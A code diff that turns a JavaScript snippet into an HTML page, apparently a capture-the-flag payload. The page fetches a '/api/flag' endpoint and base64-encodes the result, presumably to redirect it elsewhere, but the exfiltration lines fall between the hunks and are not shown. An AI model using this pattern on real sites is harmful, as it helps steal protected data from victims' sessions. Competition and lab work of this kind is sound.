@@ -1,4 +1,13 @@
-fetch('/api/flag')
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fetch and Redirect</title>
+</head>
+<body>
+    <script>
+        fetch('/api/flag')
     .then(response => response.text())
     .then(text => {
         const encodedFlag = btoa(text);
@@ -21,3 +30,7 @@ fetch('/api/flag')
     .catch(error => {
         console.error('Error fetching flag:', error);
     });
+
+    </script>
+</body>
+</html>
